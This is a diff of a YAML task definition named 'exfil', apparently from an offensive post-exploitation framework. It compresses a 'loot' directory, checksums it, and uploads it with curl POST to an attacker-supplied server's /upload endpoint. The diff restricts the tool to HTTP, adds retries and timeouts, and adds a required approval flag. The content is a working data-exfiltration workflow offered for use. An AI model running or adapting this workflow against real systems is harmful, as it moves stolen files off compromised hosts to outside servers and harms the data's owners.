@@ -1,6 +1,7 @@
 name: exfil
-description: Data exfiltration — compress and exfiltrate data via HTTP POST, DNS tunneling,
-  or SCP/SSH.
+description: Data exfiltration over HTTP — archive the loot, verify its integrity
+  with a SHA256 checksum, and upload it via HTTP POST. Only HTTP transfer is
+  implemented. Requires explicit authorization (approved input).
 tags:
 - post
 - exfil
@@ -12,16 +13,20 @@ dispatch:
     target:
       required: true
       type: string
-      description: Path to loot directory or files to exfiltrate
+      description: Path to the loot directory or file (comma-separated file list allowed)
       alias: t
     method:
       type: string
       default: http
-      description: 'Exfil method: http, dns, scp, smb'
+      description: 'Exfil method: http (only supported value)'
     server:
+      required: true
       type: string
-      default: ''
-      description: Exfil server (required for http/scp)
+      description: Exfil server base URL (the archive is POSTed to <server>/upload)
+    approved:
+      required: true
+      type: boolean
+      description: Explicit authorization for this action (required)
     log_command:
       type: string
       default: 'true'
@@ -29,26 +34,41 @@ dispatch:
 jobs:
   compress:
     name: Compress Loot
+    run_if: '{{ inputs.approved }}'
+    outputs:
+      archive: '{{ steps.checksum.outputs.archive }}'
+      sha256: '{{ steps.checksum.outputs.sha256 }}'
+      size: '{{ steps.checksum.outputs.size }}'
     steps:
-    - name: tar-gz
-      module: local.builtin.shell
+    - name: archive
+      module: local.archive
       with:
-        cmd: tar -czf {{ env.OFX_RUN_DIR }}/loot.tar.gz -C {{ inputs.target }} . 2>&1
-      continue-on-error: true
+        target: "{{ inputs.target }}"
+      continue-on-error: false
       log-command: '{{ inputs.log_command }}'
+      timeout: 30
     - name: checksum
       module: local.checksum
-      with: {}
+      with:
+        archive: "{{ steps.archive.outputs.archive }}"
+      if: success()
+      continue-on-error: false
+      log-command: '{{ inputs.log_command }}'
+      timeout: 5
   exfil-http:
     name: HTTP Exfiltration
-    run_if: '{{ inputs.method == ''http'' and inputs.server }}'
+    run_if: '{{ inputs.approved and inputs.method == ''http'' and ''archive'' in jobs.compress.outputs }}'
     needs:
     - compress
     steps:
     - name: curl-post
       module: local.builtin.shell
       with:
-        cmd: curl -X POST -F "file=@{{ env.OFX_RUN_DIR }}/loot.tar.gz" {{ inputs.server
-          }}/upload 2>&1
-      continue-on-error: true
+        cmd: set -o pipefail; curl --fail-with-body --show-error --retry 2 --retry-all-errors
+          --connect-timeout 15 --max-time 600 -X POST -F "file=@{{ jobs.compress.outputs.archive
+          }}" {{ inputs.server }}/upload 2>&1 | tee {{ env.OFX_RUN_DIR }}/exfil_upload.log
+      retry: 2
+      retry-delay: 10
+      continue-on-error: false
       log-command: '{{ inputs.log_command }}'
+      timeout: 15
